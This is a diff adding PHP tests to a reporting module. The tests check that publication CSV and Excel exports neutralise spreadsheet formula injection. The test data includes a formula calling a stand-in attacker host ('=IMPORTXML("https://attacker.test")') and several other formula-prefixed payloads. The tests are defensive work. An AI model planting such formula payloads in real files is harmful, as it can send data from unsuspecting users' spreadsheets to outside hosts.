@@ -16,6 +16,7 @@ use Modules\Publishing\Models\Kanal;
 use Modules\Publishing\Models\Publikasi;
 use Modules\Scheduling\Models\Penugasan;
 use Modules\Scheduling\Models\PeranProduksi;
+use PhpOffice\PhpSpreadsheet\IOFactory;
 
 function penggunaLaporan(bool $denganIzin = true): User
 {
@@ -154,4 +155,64 @@ it('mengunduh CSV publikasi sesuai filter aktif', function () {
         ->set('selesai', '2026-07-31')
         ->call('unduhCsvPublikasi')
         ->assertFileDownloaded('laporan-publikasi-2026-07-01-2026-07-31.csv');
+});
+
+it('mengekspor sel CSV yang diawali formula sebagai teks literal', function () {
+    $user = penggunaLaporan();
+    dataEvaluasiPrPlan($user);
+    $publikasi = Publikasi::firstOrFail();
+
+    foreach (['=IMPORTXML("https://attacker.test")', '+1+1', '-payload', '@payload'] as $nilai) {
+        $publikasi->update(['url' => $nilai]);
+        $download = Livewire::actingAs($user)
+            ->test(PusatLaporan::class)
+            ->set('mulai', '2026-07-01')
+            ->set('selesai', '2026-07-31')
+            ->call('unduhCsvPublikasi')
+            ->effects['download'];
+
+        $baris = str_getcsv(explode("\n", base64_decode($download['content']))[1]);
+
+        expect($baris)->toContain("'{$nilai}");
+    }
+});
+
+it('mengunduh laporan publikasi Excel dan PDF', function () {
+    $user = penggunaLaporan();
+    dataEvaluasiPrPlan($user);
+
+    Livewire::actingAs($user)
+        ->test(PusatLaporan::class)
+        ->set('mulai', '2026-07-01')
+        ->set('selesai', '2026-07-31')
+        ->call('unduhExcelPublikasi')
+        ->assertFileDownloaded('laporan-publikasi-2026-07-01-2026-07-31.xlsx');
+
+    Livewire::actingAs($user)
+        ->test(PusatLaporan::class)
+        ->set('mulai', '2026-07-01')
+        ->set('selesai', '2026-07-31')
+        ->call('unduhPdfPublikasi')
+        ->assertFileDownloaded('laporan-publikasi-2026-07-01-2026-07-31.pdf');
+});
+
+it('menyimpan kolom teks Excel sebagai teks literal', function () {
+    $user = penggunaLaporan();
+    dataEvaluasiPrPlan($user);
+    $publikasi = Publikasi::firstOrFail();
+    $publikasi->update(['url' => '=1+1']);
+
+    $download = Livewire::actingAs($user)
+        ->test(PusatLaporan::class)
+        ->set('mulai', '2026-07-01')
+        ->set('selesai', '2026-07-31')
+        ->call('unduhExcelPublikasi')
+        ->effects['download'];
+
+    $temp = tmpfile();
+    fwrite($temp, base64_decode($download['content']));
+    $spreadsheet = IOFactory::load(stream_get_meta_data($temp)['uri']);
+
+    expect($spreadsheet->getActiveSheet()->getCell('E2')->getDataType())->toBe('s')
+        ->and($spreadsheet->getActiveSheet()->getCell('E2')->getValue())->toBe('=1+1');
 });
